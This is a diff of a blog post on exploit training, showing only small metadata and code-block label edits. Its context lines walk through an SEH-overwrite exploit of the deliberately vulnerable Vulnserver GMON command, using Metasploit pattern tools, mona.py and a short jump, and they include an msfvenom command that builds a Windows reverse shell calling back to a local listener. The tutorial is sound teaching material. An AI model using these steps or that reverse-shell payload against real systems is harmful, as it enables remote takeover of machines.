@@ -5,7 +5,7 @@
 :tags: osce, vulnserver, training, exploit
 :image: cover.png
 :alt: Photo by Roberto Gomez Angel on Unsplash
-:description: In previous posts, we have seen different techniques to exploit Vulnserver commands. All of them have something in common: direct EIP overwrite. In this post, we will explore Structured Exception Handling (SEH) overwriting for taking control of the flow of our victim application.
+:description: This post will show how to exploit the Vulnserver GMON command using Structured Exception Handling (SEH) overwrite.
 :keywords: Bussiness, Information, Security, Protection, Hacking, Exploit, OSCE
 :author: Andres Roldan
 :writer: aroldan
@@ -180,7 +180,7 @@ We first need to find the exact offset on where the `SEH` handler gets
 overwritten. We can do that by creating a cyclic pattern
 using `pattern_create.rb` from Metasploit:
 
-[source,bash]
+[source,console]
 ----
 $ msf-pattern_create -l 5000
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac....
@@ -212,7 +212,7 @@ As you can see, the handler was overwritten with `346F4533`.
 To find the offset in which the `SEH` handler gets overwritten,
 we can use `pattern_offset.rb`:
 
-[source,bash]
+[source,console]
 ----
 $ msf-pattern_offset -q 346F4533
 [*] Exact match at offset 3551
@@ -295,7 +295,7 @@ other 4 bytes. The `RET` will redirect the execution flow to our buffer.
 
 We can find those 3 instructions using many ways. I will use `mona.py`:
 
-[source,bash]
+[source,console]
 ----
 !mona seh -cp nonull -cm safeseh=off -o
 ----
@@ -364,7 +364,7 @@ So, we must perform a short jump of at least 8 bytes to pass *over* our
 injected address and land on our `C` buffer.
 We can get the needed opcodes using `nasm_shell.rb`:
 
-[source,bash]
+[source,console]
 ----
 $ msf-nasm_shell
 nasm > jmp short +0xa
@@ -457,7 +457,7 @@ Great! All that's left is to insert a shellcode. Let's do that.
 
 We can create a reverse shellcode using `msfvenom` from Metasploit:
 
-[source,bash]
+[source,console]
 ----
 $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.18 LPORT=4444 EXITFUNC=seh -f python -v SHELL -b '\x00'
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
